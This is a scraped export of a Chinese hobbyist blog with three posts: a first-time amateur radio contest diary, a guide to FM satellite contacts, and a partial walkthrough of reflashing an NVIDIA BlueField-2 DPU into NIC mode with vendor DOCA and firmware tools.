和母亲联系好他同事，约定好第二天早上6点出发，自己则准备好要带的各种东西，担心那边没排插用，从家里找了一堆排插，甚至连 16A 的空调延长线也带上了，加了一个米家的空调伴侣 Pro，因为那上面有 10A 的插口，就这样带了一大袋的排插。 对这次比赛还特意准备了风绳，地钉是用之前做 GP 天线剩下的9.9元10根的管钉 + M10 的吊环螺母做的地钉，算是废物利用了，以下是比赛准备的东西列表。 主要 IC-7300 笔记本电脑 华为服务器电源 + 电源线 XT60 转 ICOM 口电源线 2 根 天线 20m EFHW 2el 拉杆 Yagi GP（Yagi 可变成 GP） 1:1 巴伦 3 个 1:49 巴伦 1 个 其他 手电钻 绳子 50m 地钉 4个 扎带 剪刀 一些备用的金属件 有没有发现少了什么，一个非常重要的东西，后文再做叙述。 比赛第一天前期准备6点出发，7点到达目的地的河边，等待开船来接我。 7 点 30 到达对岸，开始领域展开，发现手咪没带！赶紧联系母亲，在我的床脚下找到了手咪，问我怎么办，有没有其他办法，我说没办法。想过通过电脑的麦克风转到 ICOM 的声卡的音频输入进去，可行是可行，但是 PTT 控制有点灵车。母亲说搭摩托给我送过来，这可是有接近 10km 呢，真的感谢她。 之后呢，就忙着天线架设，按图纸的数据把拉杆扯到了指定的长度，但是谐振点不对，之后就对着天分调，最终调下来了。之后搞风绳的时候差点 QBG，应该先把支撑杆搞好再打风绳的，没拉过风绳经验不足吃亏了，还好天线没多重，稳住了。 一切准备好已经8点15分了，这时手咪也送到了，好感谢我的母亲，没有他这次比赛就泡汤了。 开干打开电台，频率上密密麻麻的信号，找了几个频率守听发现怎么听都别扭，记得之前看的文章有老师说过，有些台不喜欢用标准频率，会偏一点，点了一下频率的末尾的两个蛋，随后转波轮，这下声音才正常。 随之最困难的就出现了，我听不懂，是真的听不懂，报的字母解释法貌似是非标的，另外在 pileup 中主叫台主叫的时间也很少，让我听他们的呼号时间很少很少，通联的第一个台是 E20PFE，也算是破处了。随后就是听呼号，然后呼叫，刚开始速率是真的慢，因为一个呼号我要听 5 次以上才听的明白，尽管利用了 N1MM 的猜呼号功能，速率仍然提不上去。 在接触了 2 小时之后，经历了各种怀疑人生，渐渐 get 到了味道，能 2-3 遍听明白呼号，速率也提上来了。 通联的电台大部分都是亚洲和东南亚电台，在10点07分的时候通联到了第一个北美电台 ND7K，10点57分 KW7MM，11点54分 PX2A。此外都是亚洲和东南亚的台。 下午1点19分，第一个欧洲电台 OM2VL 出现！ 叫吃饭了，才取下耳机，发现耳鸣了。随便解决了午饭一下回到了电台前面继续干台，下午传播并不给力，都是 JA，并且速度也提不上去，起身活动了一下身子才发现腰酸背痛伴随着耳鸣头晕，有点想放弃比赛的感觉。 同时天线也转了一下，转到了 60 度，早上是 260 度。感觉 JA 信号强了很多。 稍微休息了一阵，把端馈天线架起来了，测试了一下接受效果并不理想，继续用八木干亚洲台。 后面没啥台干，随即下机，撸猫休息够了就继续扫地 太阳落山之后的时候欧洲传播开了，狠狠恰了一波系数分。 回过头看其实这段时间应该提速的，因为自己的弱抄收能力浪费了很多时间，那也没办法，毕竟第一次。 家人怕我冷，临时给我搭了个帐篷，晚上就睡在这里，还挺舒服的，有点享受这种感觉。晚上下了毛毛雨，看天气预报明天是阴天，感觉传播会变差。 在晚上的时候就在研究，看到他们有那个本地 bandmap 功能，刚开始以为这样做会违反规则，但是实际上是参加无辅助组的不能把自己的 spot 信息发出去，这个功能并不违反规则。唉，吃了没经验的亏啊。配置好了这个功能扫地还是很舒服的，给第二天的扫地上了大分。 传播到晚上 10 点差不多就结束了，仅有的几个 JA 和 HS 大台还有信号，一个最令我印象深刻的是 DY1O，在晚上大台基本上听不清的情况下，他信号过来 59+20 打雷一样。看了一下他的 QRZ 主页说的是 KILOWATTS ARE NEVER ENOUGH，哈哈，估计都是秃头佬（x 第一天以 82个 QSO 结束，之后就切换到端馈天线看了看其他波段的传播，试着 SSB 喊了一下不回我，小功率 + 低效率天线还是不行啊。后面无聊看看群，BD7PRC 传来捷报，说我的波段选对了，今天 10m 的传播非常好。晚上就挂挂 FT8，和几个老朋友成功在 40m 通联上了。 第二天晚上其实并没有多睡，晚上是挂着 10m 的 FT8 守听的，3点30分起来看了一下没传播，6点30分起来的时候看到一屏幕的 JA，甚至开了美国。 起床洗漱了一下，做了几个 QSO 之后就被叫去吃早餐了，下了一晚上的小雨，外面雾蒙蒙的，感觉今天要寄了。 开干已经是7点30分，没听到几个亚洲之外的信号，直到 9 点钟的时候才有亚洲以外的信号过来，还算比较强劲。 速率还是提不上去，一直在扫地，有了昨天配好的 bandmap 功能扫地扫的更快了，不过有几个台叫不通，拉扯几下就放弃我了，很难受。还有就是担心自己抄收呼号抄错了，有些呼号数据库里面没有，自己抄错了会扣分（但是到最后一个都没错）。 发现 JA 台听不懂我说的 seven，转而用日文的 なな(nana) 解释，Bravo Hotel number seven, number nana。很有用，解决了很多个听不懂我的英文念法的日本台。 回过头来看这张图，扣掉昨天已经通过的台，速率其实提高了很多。 就这样一直扫地扫地，期间累了利用 7300 的录音功能进行摆摊。找一个空闲频率问了几句有没有人用这个频率，没人回就开始摆摊，平均摆摊 20 分钟上钩一个吧，感觉不如去扫地。 就这样一直在干 DU, JA, YB, VU, 直到下午 3 点父亲来了，叫我回家，我一看一个小时才通了 5 个台，频率上都是干过的大台了，遂跟着回家，准备第二天早上再来。 第三天依旧夜间 FT8 挂机，看到开美国了有点激动~ 6点50分到位，依旧是 DU, YB, JA 等等离得近的台，开始疯狂扫地，最后在7点58分的时候和 JR3NZC 完成最后一个 QSO。 得分 18038，160个 QSO，终于结束~ 收尾下面是一些收尾工作的照片 10m 天线这样看的话，体积也是有蛮大的，另外有一根阵子弯折的比较厉害，新买的那根不太行，不知道影响大不大。 巴伦盒子的螺丝经过雨水一天的洗礼就生锈了，后面全换 304 螺丝了。 从上往下看 端馈巴伦螺丝也没有幸免。 拆下来的地钉。 狗窝~ 总结和展望其实在比赛还没结束的时候，就有其他的友台发自己的分数了，通过比较发现自己做的 QSO 数太少了，回过头来想了想，我能听见的台 90% 我都通联上了，QSO 数量这么少只有两种可能。传播不好 or 环境因素，看了一下周围，我这属于是山脚下，没有高度，可能这就是最大的原因吧。 其实最开始比赛是想去客席别人的台和设备，但是想了想算了。这次比赛我尽自己最大的努力，并且也没有出现关键性的错误，比赛顺利完结，一切都顺利，这就是最好的结果了。 Raw Score 出来了， BY #4，AS #37。成绩断层很大，和上一名差距有点吓人了。 同时我的 SSB DXCC 也不是个位数了，另外还多了 4 个 SSB 独有的 DXCC。 下一步的计划是学习 CW，做一个 4 单元的便携快拆八木、入坑猪网天线和学习天线设计。我玩业余无线电的目的不仅仅是通联这件事本身，而是折腾的乐趣。 感谢看到这里的各位，也同样感谢前辈们的经验分享，没有你们的支持我走不到今天这一步，希望有一天能和你们在空中相遇，也同样祝愿大家能通到更多更远的电台~","categories":[{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"}],"tags":[{"name":"短波","slug":"短波","permalink":"https://blog.irec.moe/tags/%E7%9F%AD%E6%B3%A2/"},{"name":"比赛","slug":"比赛","permalink":"https://blog.irec.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"如何正确的优雅的完成 FM 卫星通联","slug":"无线电/如何正确的优雅的完成FM卫星通联","date":"2024-09-09T04:00:00.000Z","updated":"2024-10-30T09:28:38.196Z","comments":true,"path":"/qsoviasat.html","permalink":"https://blog.irec.moe/qsoviasat.html","excerpt":"","text":"近期在打 ISS 的时候发现挺多的友台入坑了，晚间的 ISS 非常热闹。作为一个入坑 FM 卫星通联 6 个月的无线电爱好者，掌握了一定的通联技巧，所以在此分享一下我的经验。 前期准备硬件部分你需要有一台上了证的电台、一根八木天线，其实其他类型的天线也能上，但是我建议积累一定经验之后再来操作比较好。 八木天线推荐 JYR 的 U7V4，双极化对于 SO-50 这种卫星很舒服，我的建议是一步到位，虽然天线的价格可以买3个 K6 了，曾经我也是从 U5V3 换过来的，打 SO-50 手拧成麻花了。 需要一根两头都是M公的馈线，长度 1m - 0.5m 就够了，一个 SMA 母头转 M 母的的转接头。 为啥不直接用 SMA 到 M 头的馈线？别问，问就是馈线会 QBG。 辅助设备需要有一个手机支架，我用的是闪魔的骑行支架，可以直接夹在主梁上，他的设计拆装很方便。 天馈部分所有用到的购买链接都在这里 名称 SKU 购买链接 二维码 馈线 M公头-M公头 1m https://item.taobao.com/item.htm?id=628307067506 天线 JYR U7V4 https://item.taobao.com/item.htm?id=6365910487 转接头 SMA母转M母 https://item.taobao.com/item.htm?id=616640602871 手机支架 车把款 https://item.taobao.com/item.htm?id=787258619047 软件部分对于 FM 卫星通联，会受到一个叫多普勒效应的影响，这使得接受和发射的频率并不是固定的，所以我们一般会设置 5 个频率，并存储到信道中。这是在 HamCQ 论坛中分享的频率表，找到想要上的卫星然后写入到电台中的信道中，并做好区域划分，在此不做过多叙述。 对于卫星通联，还有一个问题是：如何知道卫星什么时候过境，什么时候出境？卫星什么时候开机？ 卫星出入境Look4Sat 可以帮你解决这个问题，他是一款开源免费的 Android 端追星软件，界面非常简洁直观。 初次使用只需要去设置里面更新 GPS 和 转发器数据，再添加想要的卫星，就能到主界面看到了。在打卫星的时候软件的具体操作后续有演示。 卫星状况卫星的状态可以在这个网站上查看到：https://www.amsat.org/status/ 这是爱好者自行反馈的状态。 PO-101 和 UVSQ 卫星的 FM 转发器的开机时刻是在 X 上有发推文，ISS 的维护时刻表在 AMSAT 网站上有。 前期准备部分就结束了，接下来就是最重要的部分，也是我最想告诉大家的。 如何提高 QSO 效率卫星的选择卫星的选择是非常重要的，我们目前常用的 FM 卫星有 ISS, SO-50, AO-91 和 PO-101。 ISS 最近挤成菜市场了，还被各种高功率压制，很难完成 QSO。但是你可以在晚上3点到早上9点的时候去上，因为没人，就算你用原装天线也能上的去。 SO-50 因为转发器体质不佳，转发质量越来越差，而且有频偏。不过最近又好起来了，他只有0.25W的功率，但声音质量也很棒。 AO-91 好像是电池坏了，只在白天能用，并且转发器也有问题，断续很严重。 相比之下 PO-101 则很棒了，唯一的缺点是需要等开机时间，并且上去的难度也挺高的，对天线和环境有一定的要求，PO-101 是我挺喜欢上的一颗卫星，QSO 效率很高，而且也不挤。 还有一颗 SO-121，开机随缘，声音说实话还可以，很有意思，可以约别人一起去玩。 其实只要选对卫星，你通联的效率就会成倍的提升，并且可以直接避免被人压制导致空军，然后一肚子气提控回家。 所以总的来说，我的建议就是挑阴间时间上 ISS 和 SO-50，PO-101 看开机时间去上。 如何正确完成卫星通联秩序对于这个，我唯一强调的是通联的秩序，相信你肯定不想在和别人 QSO 的过程中被人一句 CQ Satellite 打断吧。 对于正在通联的双方来说，可能某一方回复另一方的时候被压制了，导致 QSO 终端。然后另一方又开始回复对方，可能这个时候有其他友台回复你了，然后你压的那方又继续在和那一方在通联，把你也压了。这就是一个死循环了，最后谁也没完成 QSO。 你们别吵啦，一个一个来 正确方法最重要的是先守听，等待听到有下行信号（载波&#x2F;话音）时，在别人 QSO 结束的结尾，找到间隙主动呼叫对方。 以下是示例： BG7QIW: Bravo Hotel Seven Foxtrot Bravo Papa, Bravo Golf Seven Quebec India Whiskey five nine BH7FBP: Bravo Golf Seven Quebec India Whiskey, Bravo Hotel Seven Foxtrot Bravo Papa U ALSO five nine seventeen three~ BG7QIW: seventeen three! 这时你可以插入，主动呼叫 BG7QIW 或者 BH7FBP，因为他俩上下行都很不错，呼叫他俩 QSO 的成功率对于你自己来说会很高。如果你主动 CQ 的话，这样就耽搁了一个时隙，别人需要呼叫你，你再回复。这样相较于主动呼叫别人时间耗费更多，降低了效率。 例如： BH7FBP: Bravo Golf Seven Quebec India Whiskey, Bravo Hotel Seven Foxtrot Bravo Papa, U ALSO five nine seventeen three~ BG7QIW: seventeen three! BI7BMB: Bravo Golf Seven Quebec India Whiskey, Bravo India Seven Bravo Mike Bravo five by nine BG7QIW: Bravo %$#Buzzzzz%$# Bravo %$#Buzzzzz%$# Seven Quebec %$#Buzzzzz%$# 欸，怎么没抄完整，我应不应该回复他。没问题！大胆回复他，就算没抄完整，只要你有90%的把握他在呼叫你，直接回复。这时应该回复什么呢。 BI7BMB: QSL Seventeen Three! &#x2F; 抄收了 73 再见 关于呼叫大家在卫星上呼叫的用语有挺多种的，我目前用的是呼号 + 网格。这是在 AMSAT 网站 上关于 FM 卫星通联推荐的做法。关于这个也挺有争议的，我的意见是：不论你说什么，能简短迅速的让别人知道的呼号，就够了。 什么时候可以主动呼叫呢，只有当你有十足的把握卫星当前是空闲没人在通联的状态，并且你的上行能上去，或你有全双工的设备，实时能返听到你的话音的情况下，那可以随意呼叫。 我一般是某趟卫星在阴间时间，并且在仰角（5°-10°）发现没有下行，然后掐 PTT 发现有回波的时候，我会这样做。 但是热门时段就千万别这样做了，可能你没有下行信号的时候，你上行信号上去了把别人压制了，然后就是之前我说的惨状，这现象在 SO-50 上非常常见，聋子很多。 回波：指掐 PTT 之后能听到有空音频的载波信号下来，同时场强表有明显的上升，随后变成沙沙声，那段空音频就是回波。在卫星通联中只有 ISS 比较明显。受限于电台型号的不同，某些电台型号效果不明显，或者开了尾音消除。建议新手不要这样做，耐心等待有下行即可。 通联示范接下来就是我通联的示范了，我用的是 8600 + U7V4。 视频演示 FAQ通联的时候抄不清对方呼号怎么办？多听，多练，这是一个熟能生巧的过程，不可能一天之内变得很熟练。 我的技巧是每次打卫星都把手机的录音打开，当别人在呼叫你，而你吵不清别人呼号的时候或脑子反应不过来（我也是这样），直接鹦鹉学舌，他怎么样说过来的，你把他说的那段话带着你的呼号回给他，当这趟卫星打完了之后，再慢慢听录音，只要确保对方把你的呼号抄正确了就行。 还有一个技巧就是挑没人的时候去上卫星，就算抄不清，你可以要求别人重复过来一遍，一般大家都会耐心的等你俩通联完再来通联。 BI7BMB: Bravo Golf Question? &#x2F; Please Again &#x2F; 再来一下好吗 BG7QIW: Bravo Golf Seven Quebec India Whiskey Queen Italian Whisky BG7QIW BI7BMB: BG7QIW BI7BMB 59 73 BG7QIW: 73 就像这样，这个时间段不会有人来压制 &#x2F; 插入你们俩之间。而是慢慢的等你们通联完，再来呼叫。然后你可能会被轰炸，叫你让你回到嘴巴冒烟，因为你是新台，23333。 别人反馈我的话音质量很差 &#x2F; 我收到的下行很差首先检查的应该是天线情况，有可能你的八木的引向器装反了，或者是装错位置了，有条件的直接上驻波表测试。还有一个原因是你的手机指南针不准，对歪了。这个时候你可以靠感觉来调整，找到一个下行比较好的位置，同时观察手机屏幕角度的变化随之调整你手举着的天线的方位角和仰角。 手机指南针失灵是很正常的，我打卫星几乎有一半的概率指南针会飘。不过自己玩得多了，靠感觉盲指也没问题，这也是一个熟练度的问题。 2024.09.09 BH7FBP 审稿：BG7QIW","categories":[{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/categories/%E6%97%A0%E7%BA%BF%E7%94%B5/"}],"tags":[{"name":"卫星","slug":"卫星","permalink":"https://blog.irec.moe/tags/%E5%8D%AB%E6%98%9F/"}]},{"title":"NVIDIA BlueField-2 DPU 配置为 NIC 网卡的折腾过程","slug":"硬件/20240716_NVIDIA BlueField-2 DPU 配置为 NIC 网卡的折腾过程/BlueField-2 DPU ES","date":"2024-07-16T04:00:00.000Z","updated":"2024-08-15T06:20:07.360Z","comments":true,"path":"/nvidia_boyfriend.html","permalink":"https://blog.irec.moe/nvidia_boyfriend.html","excerpt":"","text":"前情提要朋友搞来一块 NVIDIA BlueField-2 给我来玩玩，据说是他进 DPU 里面的 ARM 系统里面执行了一下更新命令，然后电脑设备管理器就感叹号了，里面的 ARM 跑着的系统也挂了。具体的情况他也不清楚，反正就到我手上了。 让他发了一块好的和一块坏的，两张都收到了，还带了一个 VMWare的 Edge 310 给我来研究。 实物情况第一块图片是后补的，不要介意。 背面标签Model No：BF2M345A P&#x2F;N: MBF2M345A-VENOT_ES S&#x2F;N: MT219X37294 开机非常慢，设备管理器有一个模块报错误10 使用和主机通讯的串口，不知道账户和密码，只能重置了。 启动信息1234567891011121314151617Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: BL2R: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2R: Built : 18:59:31, Jul 22 2021 NOTICE: BL2R built for hw (ver 1) NOTICE: No CDI given, can&#39;t complete Riot operation NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2: Built : 18:59:30, Jul 22 2021 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL31: Built : 18:59:31, Jul 22 2021 NOTICE: BL31 built for hw (ver 1) 固件版本123456789101112131415161718192021C:\\Program Files\\Mellanox\\WinMFT&gt;mlxfwmanager.exe Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 第二块启动信息1234567891011121314151617Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: BL2R: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2R: Built : 18:59:31, Jul 22 2021 NOTICE: BL2R built for hw (ver 1) NOTICE: No CDI given, can&#39;t complete Riot operation NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL2: Built : 18:59:30, Jul 22 2021 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.7.1-1-g7a249ba NOTICE: BL31: Built : 18:59:31, Jul 22 2021 NOTICE: BL31 built for hw (ver 1) 固件版本123456789101112131415161718Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: mt41686_pciconf0 Base GUID: b8cef60300fc5446 Base MAC: b8cef6fc5446 Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 资源所有的资源都是来自 NVIDIA 官网 文档DOCA 文档https://docs.nvidia.com/networking/dpu-doca/index.html#doca 1.5.1 LTS 文档https://docs.nvidia.com/doca/archive/doca-v1.5.1/index.html NVIDIA DOCA Installation Guide for Linux DOCAhttps://developer.nvidia.com/doca-downloads 这里 下载 DOCA 历史版本 网卡固件https://linux.mellanox.com/public/repo/ 具体步骤物主要求把卡弄好，当成正常的 CX6 网卡使用，参考了下面两个教程和官网的文档。 https://www.bilibili.com/video/BV1Cm421s7sq https://www.bilibili.com/read/cv32771337 1、安装 Ubuntu这个就不用说了吧。 2、安装 DOCA 环境直接装最新版的就行，不需要特意装1.5.1版本的。 1234wget https://www.mellanox.com/downloads/DOCA/DOCA_v2.7.0/host/doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb sudo dpkg -i doca-host_2.7.0-209000-24.04-ubuntu2204_amd64.deb sudo apt-get update sudo apt-get -y install doca-all 如果碰到卡在 building initial module ，请关闭主板的 Secure Boot 功能。 3、启动 rshim1sudo systemctl start rshim 4、使用 minicom 连接 DPU如果没装过的话记得 sudo apt get install minicom 一下。 1sudo minicom -D /dev/rshim0/console 5、重置 DPU 的 ARM 核1sudo echo &quot;SW_RESET 1&quot; &gt; /dev/rshim0/misc 6、向 DPU 更新 DOCA 1.5.1-LTS 版本首先必须得更新到这个版本，再更新网卡驱动，直接更新最新的 DOCA 版本的话系统会起不来，如图所示。 1bfb-install --rshim rshim0 --bfb DOCA_1.5.1_BSP_3.9.3_Ubuntu_20.04-4.2211-LTS.signed.bfb 7、启动成功，修改默认账户和密码123456789101112131415161718Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: No CDI passed to Riot core! NOTICE: BL2R: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL2R: Built : 19:38:23, Oct 21 2022 NOTICE: BL2R built for hw (ver 1) NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL2: Built : 19:38:22, Oct 21 2022 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):3.9.3-4-g43fe858 NOTICE: BL31: Built : 19:38:22, Oct 21 2022 NOTICE: BL31 built for hw (ver 1) UEFI firmware (version BlueField:3.9.3-7-g8f2d8ca built at 19:40:49 on Oct 21 2022) ubuntu ubuntu ubuntu Bf112233 8、备份网卡固件在宿主机上执行 123456789101112sudo mst status MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded MST devices: ------------ /dev/mst/mt41686_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:06:00.0 addr.reg=88 data.reg=92 cr_bar.gw_offset=-1 Chip revision is: 01 备份固件命令，这里请根据具体的PCI地址来修改。 123456flint -d 06:00.0 query full &gt; flint_query.txt flint -d 06:00.0 hw query &gt; flint_hwinfo.txt flint -d 06:00.0 ri orig_firmware.mlx flint -d 06:00.0 dc orig_firmware.ini flint -d 06:00.0 rrom orig_rom.mlx mlxburn -d 06:00.0 -vpd &gt; orig_vpd.txt 9、启动 mst 服务，查询网卡版本123456789101112131415161718192021222324252627282930313233343536373839404142434445// 启动 mst 服务 sudo mst start Starting MST (Mellanox Software Tools) driver set Loading MST PCI module - Success [warn] mst_pciconf is already loaded, skipping Create devices Unloading MST PCI module (unused) - Success // 查看 mst 状态 sudo mst status MST modules: ------------ MST PCI module is not loaded MST PCI configuration module loaded MST devices: ------------ /dev/mst/mt41686_pciconf0 - PCI configuration cycles access. domain:bus:dev.fn=0000:03:00.0 addr.reg=88 data.reg=92 cr_bar.gw_1 Chip revision is: 01 // 查询网卡版本信息 sudo mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gent PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 N/A PXE 3.6.0401 N/A UEFI 14.24.0013 N/A UEFI Virtio blk 22.1.0011 N/A UEFI Virtio net 21.1.0011 N/A Status: No matching image found 10、更新网卡固件到 24.35 版本这个固件是包含在 DOCA 1.5.1 内的，据作者在评论区所说这是最后一个包含这个网卡 PSID 的最后一个版本系统。所以先刷 DOCA 1.5.1，再升级到 DOCA 2.7，再升级最新的网卡固件。能不能跳过这个步骤直接升级最新的网卡固件我不知道，我也不愿意试试，毕竟不便宜。 12345678910111213141516171819202122232425262728293031// 更新固件 sudo /opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686 Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 24.35.2000 NVMe N/A 20.4.0001 PXE 3.6.0401 3.6.0805 UEFI 14.24.0013 14.28.0016 UEFI Virtio blk 22.1.0011 22.4.0010 UEFI Virtio net 21.1.0011 21.4.0010 Status: Update required --------- Found 1 device(s) requiring firmware update... Perform FW update? [y/N]: y Device #1: Updating FW ... FSMST_INITIALIZE - OK Writing Boot image component - OK 从系统内提取固件（不需要操作）下面是提取这个固件的命令，我已经提取好了，不用再操作了 1scp ubuntu@192.168.100.2:/opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686 / 提取出来的固件解包通过 mft-scripts 可以看到是有这个 PSID 的 181. MT_0000000809 MBF2M345A-VENOT_ES_Ax NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa 然后从 mlnx-fw-updater_23.10-3.2.2.0_arm64.deb 中解包找到了最新的固件 24.39.3560 157. MT_0000000809 MBF2M345A-VENOT_ES_Ax NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa 11、冷重启电脑，查看网卡版本查看到网卡版本已经更新到24.35.2000了 123456789101112131415161718192021root@recopec-MS-7D25:/home/recopec# mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: 0000:06:00.0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 N/A PXE 3.6.0805 N/A UEFI 14.28.0016 N/A UEFI Virtio blk 22.4.0010 N/A UEFI Virtio net 21.4.0010 N/A Status: No matching image found 这个版本 UEFI BIOS 里面仍旧没有网卡模式选项，所以继续升级版本。 12、DPU 更新 DOCA 2.7 版本1bfb-install --rshim rshim0 --bfb bf-bundle-2.7.0-33_24.04_ubuntu-22.04_prod.bfb 更新过程中会提示更新 NIC FW 错误，不用管他 13、启动成功后修改默认账户和密码123456789101112131415161718Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: No CDI passed to Riot core! NOTICE: BL2R: v2.2(release):4.7.0-25-g5569834 NOTICE: BL2R: Built : 22:05:22, Apr 26 2024 NOTICE: BL2R built for hw (ver 1) NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):4.7.0-25-g5569834 NOTICE: BL2: Built : 22:05:22, Apr 26 2024 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):4.7.0-25-g5569834 NOTICE: BL31: Built : 22:05:22, Apr 26 2024 NOTICE: BL31 built for hw (ver 1), lifecycle GA Non-Secured UEFI firmware (version BlueField:4.7.0-42-g13081ae-BId13127 built at 22:23:12 o) ubuntu ubuntu ubuntu Bf1122334455 13、更新网卡版本1234567891011121314151617181920212223sudo mst start sudo mst status sudo mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-pt PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 N/A PXE 3.6.0805 N/A UEFI 14.28.0016 N/A UEFI Virtio blk 22.4.0010 N/A UEFI Virtio net 21.4.0010 N/A Status: No matching image found 传送网卡固件到 DPU 内 1scp mlxfwmanager_sriov_dis_aarch64_41686 ubuntu@192.168.100.2:/home/ubuntu/ 123456789101112131415161718192021222324sudo chmod +x mlxfwmanager_sriov_dis_aarch64_41686 sudo ./mlxfwmanager_sriov_dis_aarch64_41686 Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 24.39.3560 NVMe N/A 20.4.0001 PXE 3.6.0805 3.7.0300 UEFI 14.28.0016 14.32.0017 UEFI Virtio blk 22.4.0010 22.4.0012 UEFI Virtio net 21.4.0010 21.4.0013 Status: Update required 冷重启之后查看到更新完成 14、切换为 NIC 模式https://docs.nvidia.com/doca/sdk/nvidia+bluefield+modes+of+operation/index.html#src-2609505413_id-.NVIDIABlueFieldModesofOperationv2.7.0-NICModeforBlueField-2 非常简单，官方提供了几种模式，其中最方便的是在 ARM 的 UEFI BIOS 里面修改。 Select “Device Manager”. Select “System Configuration”. Select “BlueField Modes”. Set the “NIC Mode” field to NicMode to enable NIC mode. 上面的貌似不起作用，用下面这个试试。 12// 启用 NIC 模式 mlxconfig 